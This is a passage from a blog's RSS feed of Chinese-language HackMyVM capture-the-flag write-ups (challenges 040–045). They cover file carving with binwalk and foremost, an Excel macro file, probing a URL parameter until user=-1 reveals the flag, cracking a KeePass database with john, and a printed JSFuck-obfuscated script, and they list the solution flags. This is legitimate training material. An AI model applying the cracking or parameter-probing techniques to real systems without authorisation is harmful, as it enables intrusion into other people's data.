Pixels Per Unit Y               : 3780
Pixel Units                     : meters
Image Size                      : 304x481
Megapixels                      : 0.146
                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ stegseek image.png 
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[!] error: the file format of the file 'image.png' is not supported.
                                   
```

stringsÁûÑ‰∫Ü‰∏Ä‰∏ã

Âπ∂‰∏îÊãøbinwalkÈ™åËØÅ‰∏Ä‰∏ã

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ binwalk 045.zip

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             Zip archive data, at least v2.0 to extract, compressed size: 79069, uncompressed size: 79263, name: image.png
79108         0x13504         PNG image, 400 x 300, 8-bit/color RGBA, non-interlaced
79644         0x1371C         Zlib compressed data, best compression
83826         0x14772         End of Zip archive, footer length: 22

           
```

ÂÆÉÂ°û‰∫ÜÁÇπ‰∏úË•ø

ËØï‰∫Ü‰∏Ä‰∏ãbinwalk‰∏çË°å
```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ binwalk --extract 045.zip

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
0             0x0             Zip archive data, at least v2.0 to extract, compressed size: 79069, uncompressed size: 79263, name: image.png
79644         0x1371C         Zlib compressed data, best compression

WARNING: One or more files failed to extract: either no utility was found or it's unimplemented

                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ cd _045.zip.extracted 
                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/_045.zip.extracted]
‚îî‚îÄ$ ls -al
total 650
drwxr-xr-x 1 kali kali      0 Jun 17 00:44 .
drwxr-xr-x 1 kali kali  16384 Jun 17 00:44 ..
-rwxr-xr-x 1 kali kali  83848 Jun 17 00:44 0.zip
-rwxr-xr-x 1 kali kali 480300 Jun 17 00:44 1371C
-rwxr-xr-x 1 kali kali   4204 Jun 17 00:44 1371C.zlib
-rwxr-xr-x 1 kali kali  79263 Dec 15  2023 image.png
                                      
```

ÈÇ£ÊãøforemostËØï‰∏Ä‰∏ã

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ foremost 045.zip       
Processing: 045.zip
ÔøΩÔøΩÔøΩ2ÔøΩÔøΩH»†mÔøΩIÔøΩÔøΩRÔøΩÔøΩuÔøΩÔøΩÔøΩ2kÔøΩÔøΩ,ÔøΩÔøΩhÔøΩ2ÔøΩÔøΩÔøΩ6mÔøΩ}:ÔøΩgÔøΩ10dÔøΩÔøΩÔøΩÔøΩ^‹∞—åoÔøΩÔøΩMÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ◊∂ÔøΩÔøΩÔøΩyÔøΩsÔøΩyÔøΩÔøΩÔøΩÔøΩsoÔøΩ{MÔøΩ{ÔøΩÔøΩ(IHHÔøΩ(ÔøΩÔøΩ&amp;!!ÔøΩÔøΩÔøΩÔøΩ7ÔøΩOÔøΩR|ÔøΩÔøΩ;ÔøΩAÔøΩÔøΩÔøΩiÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩDÔøΩÔøΩkÔøΩOfÔøΩMÔøΩÔøΩÔøΩ
              +)ÔøΩÔøΩÔøΩdÔøΩÔøΩÔøΩnÔøΩ+ÔøΩÔøΩÔøΩÔøΩWÔøΩÔøΩÔøΩÔøΩÔøΩ
*|
           
```

???

ÈáçÊñ∞‰∏ã‰∏ÄÈÅç

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ foremost 045.zip
ERROR: /mnt/hgfs/gx/output is not empty
        Please specify another directory or run with -T.
                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ rm -rf /mnt/hgfs/gx/output
                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ foremost 045.zip          
Processing: 045.zip
ÔøΩÔøΩÔøΩ2ÔøΩÔøΩH»†mÔøΩIÔøΩÔøΩRÔøΩÔøΩuÔøΩÔøΩÔøΩ2kÔøΩÔøΩ,ÔøΩÔøΩhÔøΩ2ÔøΩÔøΩÔøΩ6mÔøΩ}:ÔøΩgÔøΩ10dÔøΩÔøΩÔøΩÔøΩ^‹∞—åoÔøΩÔøΩMÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ◊∂ÔøΩÔøΩÔøΩyÔøΩsÔøΩyÔøΩÔøΩÔøΩÔøΩsoÔøΩ{MÔøΩ{ÔøΩÔøΩ(IHHÔøΩ(ÔøΩÔøΩ&amp;!!ÔøΩÔøΩÔøΩÔøΩ7ÔøΩOÔøΩR|ÔøΩÔøΩ;ÔøΩAÔøΩÔøΩÔøΩiÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩDÔøΩÔøΩkÔøΩOfÔøΩMÔøΩÔøΩÔøΩ
              +)ÔøΩÔøΩÔøΩdÔøΩÔøΩÔøΩnÔøΩ+ÔøΩÔøΩÔøΩÔøΩWÔøΩÔøΩÔøΩÔøΩÔøΩ
*|
                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ cd output 
                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/output]
‚îî‚îÄ$ ls -al
total 21
drwxr-xr-x 1 kali kali  4096 Jun 17 00:47 .
drwxr-xr-x 1 kali kali 16384 Jun 17 00:47 ..
-rwxr-xr-x 1 kali kali   719 Jun 17 00:47 audit.txt
drwxr-xr-x 1 kali kali     0 Jun 17 00:47 png
drwxr-xr-x 1 kali kali     0 Jun 17 00:47 zip
                                   
```

okÔºåÊòØÊàëÊòæÁ§∫ÁöÑÈóÆÈ¢ò

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/output]
‚îî‚îÄ$ cd png       
                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx/output/png]
‚îî‚îÄ$ ls -al
total 9
drwxr-xr-x 1 kali kali    0 Jun 17 00:47 .
drwxr-xr-x 1 kali kali 4096 Jun 17 00:47 ..
-rwxr-xr-x 1 kali kali 4618 Jun 17 00:47 00000154.png
                                   
```

![00000154](https://7r1umphk.github.io/image/20250617125120923.webp)

```
HMV{undercover}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20045.html</guid><pubDate>Fri, 27 Jun 2025 09:30:35 +0000</pubDate></item><item><title>Challenge 044</title><link>https://7r1UMPHK.github.io/post/Challenge%20044.html</link><description>![image-20250617121752851](https://7r1umphk.github.io/image/20250617121753191.webp)

```
What type of format corresponds to the following address: bc1qspg3vsx3pphrf[...] Flag: HMV{format}

‰ª•‰∏ãÂú∞ÂùÄÂØπÂ∫îÁöÑÊ†ºÂºèÁ±ªÂûã‰∏∫Ôºöbc1qspg3vsx3pphrf[...] Ê†áÂøóÔºöHMV{format}
```

bc1‰∏ÄÁßçÂä†ÂØÜË¥ßÂ∏ÅÔºà**Bitcoin**ÔºâÁöÑÂâçÁºÄÊ†ºÂºè

ÁÑ∂ÂêéËøôÁßçÂú∞ÂùÄÊòØ‰ΩøÁî®Bech32 ÁºñÁ†ÅÊñπÊ°à

```
HMV{Bech32}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20044.html</guid><pubDate>Fri, 27 Jun 2025 09:30:33 +0000</pubDate></item><item><title>Challenge 043</title><link>https://7r1UMPHK.github.io/post/Challenge%20043.html</link><description>![image-20250617121018302](https://7r1umphk.github.io/image/20250617121018691.webp)

‰ªéÊ≠§ MS Excel Êñá‰ª∂‰∏≠ÊçïËé∑Ê†áÂøó„ÄÇ

ÈÇ£‰∏ãËΩΩ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ ll 043.zip 
-rwxr-xr-x 1 kali kali 14095 Jun 17 00:10 043.zip
                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ unzip 043.zip 
Archive:  043.zip
  inflating: Challenge.xlsm          
                   
```

![image-20250617121204452](https://7r1umphk.github.io/image/20250617121204745.webp)

ÊúâÂÆèÔºåÁúã‰∏Ä‰∏ã

ÂìàÔºåÁúã‰∏ç‰∫ÜÂÜÖÂÆπÔºåÈÇ£ÂéªkaliÊâßË°å‰∏Ä‰∏ãÂêßÔºàÂÆèÂèØ‰ª•ÂºπshellÊâÄ‰ª•Â∞èÂøÉ‰∏ÄÁÇπÔºâ

ÁÑ∂ÂêéÊ≤°ÊâßË°åÔºåÊàëÊâíÊãâÂá∫Êù•‰∫ÜÔºåÂìàÂìàÂìà

![image-20250617121717005](https://7r1umphk.github.io/image/20250617121717432.webp)

```
HMV{b63ce4efbf0b4214a470a707d34bc3ba}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20043.html</guid><pubDate>Fri, 27 Jun 2025 09:30:30 +0000</pubDate></item><item><title>Challenge 042</title><link>https://7r1UMPHK.github.io/post/Challenge%20042.html</link><description>![image-20250617113152195](https://7r1umphk.github.io/image/20250617113152556.webp)

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ curl -i http://momo.hackmyvm.eu/n1lsfr4hm/
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Tue, 17 Jun 2025 04:02:26 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive


&lt;a href='/index.php?user=1'&gt;John&lt;/a&gt;
&lt;a href='/index.php?user=2'&gt;Monroe&lt;/a&gt;
&lt;a href='/index.php?user=3'&gt;Vault&lt;/a&gt;
&lt;a href='/index.php?user=4'&gt;{&lt;/a&gt;
&lt;a href='/index.php?user=6'&gt;Wesley&lt;/a&gt;
&lt;a href='/index.php?user=7'&gt;Teresa&lt;/a&gt;
&lt;a href='/index.php?user=8'&gt;Fredric&lt;/a&gt;
&lt;a href='/index.php?user=9'&gt;}&lt;/a&gt;
                            
```

Â∞ë‰∏™5

ËÆøÈóÆ‰∏Ä‰∏ã

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ curl -i http://momo.hackmyvm.eu/n1lsfr4hm/index.php?user=5
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Tue, 17 Jun 2025 04:03:26 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive


&lt;a href='/index.php?user=1'&gt;John&lt;/a&gt;
&lt;a href='/index.php?user=2'&gt;Monroe&lt;/a&gt;
&lt;a href='/index.php?user=3'&gt;Vault&lt;/a&gt;
&lt;a href='/index.php?user=4'&gt;{&lt;/a&gt;
&lt;a href='/index.php?user=6'&gt;Wesley&lt;/a&gt;
&lt;a href='/index.php?user=7'&gt;Teresa&lt;/a&gt;
&lt;a href='/index.php?user=8'&gt;Fredric&lt;/a&gt;
&lt;a href='/index.php?user=9'&gt;}&lt;/a&gt;
&lt;br&gt;&lt;br&gt;&lt;br&gt;o_O                                                                                  
```

Ê≤°ÊèêÁ§∫ÔºåÁÑ∂ÂêéÂ∞±ËØïÂëó

10Ê≤°‰∏úË•ø

11-20ÂëäËØâÊàë‰ª¨Ê≤°ÊúâÂäûÊ≥ï

0Ê≤°Êúâ‰∏úË•ø

-1ÊòæÁ§∫‰∫Üflag

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ curl -i http://momo.hackmyvm.eu/n1lsfr4hm/index.php?user=-1
HTTP/1.1 200 OK
Server: nginx/1.18.0
Date: Tue, 17 Jun 2025 04:08:37 GMT
Content-Type: text/html; charset=UTF-8
Transfer-Encoding: chunked
Connection: keep-alive


&lt;a href='/index.php?user=1'&gt;John&lt;/a&gt;
&lt;a href='/index.php?user=2'&gt;Monroe&lt;/a&gt;
&lt;a href='/index.php?user=3'&gt;Vault&lt;/a&gt;
&lt;a href='/index.php?user=4'&gt;{&lt;/a&gt;
&lt;a href='/index.php?user=6'&gt;Wesley&lt;/a&gt;
&lt;a href='/index.php?user=7'&gt;Teresa&lt;/a&gt;
&lt;a href='/index.php?user=8'&gt;Fredric&lt;/a&gt;
&lt;a href='/index.php?user=9'&gt;}&lt;/a&gt;
&lt;br&gt;&lt;br&gt;&lt;br&gt;HMV{fcknumbers}                                                                                                                                                                                   
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20042.html</guid><pubDate>Fri, 27 Jun 2025 09:30:27 +0000</pubDate></item><item><title>Challenge 041</title><link>https://7r1UMPHK.github.io/post/Challenge%20041.html</link><description>![image-20250617112622882](https://7r1umphk.github.io/image/20250617112623238.webp)

‰∏ãËΩΩ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ ll 041.zip 
-rwxr-xr-x 1 kali kali 1824 Jun 16 23:26 041.zip
                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ unzip 041.zip 
Archive:  041.zip
 extracting: Challenge.kdbx          
               
```

**KeePass** Êï∞ÊçÆÂ∫ìÊñá‰ª∂

Â∫îËØ•ÊòØÁ†¥Ëß£ÂØÜÁ†Å

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ keepass2john Challenge.kdbx &gt; hash    
                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (KeePass [SHA256 AES 32/64])
Cost 1 (iteration count) is 2542373 for all loaded hashes
Cost 2 (version) is 2 for all loaded hashes
Cost 3 (algorithm [0=AES 1=TwoFish 2=ChaCha]) is 0 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
amigos           (Challenge)     
1g 0:00:00:51 DONE (2025-06-16 23:29) 0.01944g/s 9.953p/s 9.953c/s 9.953C/s teiubesc..letmein
Use the '--show' option to display all of the cracked passwords reliably
Session completed. 
                      
```

Êåâ‰∏™KeePassÂÆ¢Êà∑Á´Ø

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ sudo apt install keepassxc
```

![image-20250617113119656](https://7r1umphk.github.io/image/20250617113120073.webp)

```
HMV{EasyPeasyMoney}
```

sentence</description><guid isPermaLink="true">https://7r1UMPHK.github.io/post/Challenge%20041.html</guid><pubDate>Fri, 27 Jun 2025 09:30:24 +0000</pubDate></item><item><title>Challenge 040</title><link>https://7r1UMPHK.github.io/post/Challenge%20040.html</link><description>![image-20250617112222809](https://7r1umphk.github.io/image/20250617112223147.webp)

‰∏ãËΩΩ

```
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ ll 040.zip 
-rwxr-xr-x 1 kali kali 528 Jun 16 23:22 040.zip
                                                                                                                                                                                   
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ unzip 040.zip 
Archive:  040.zip
  inflating: 040.txt                 
                  
‚îå‚îÄ‚îÄ(kali„âøkali)-[/mnt/hgfs/gx]
‚îî‚îÄ$ cat -A 040.txt      
[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[+!+[]]+[+[]]+(!![]+[])[+[]]+[+!+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[+[]]+(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]]+[!+[]+!+[]]+(!![]+[])[+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]]+[+!+[]])[(![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+[+!+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[+!+[]])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]]((!![]+[])[+[]])[([][(!![]+[])[!+[]+!+[]+!+[]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([![]]+[][[]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]](([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]]+![]+(![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]]()[+!+[]+[+[]]])()[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[+[]])[([![]]+[][[]])[+!+[]+[+[]]]+(!![]+[])[+[]]+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]+!+[]]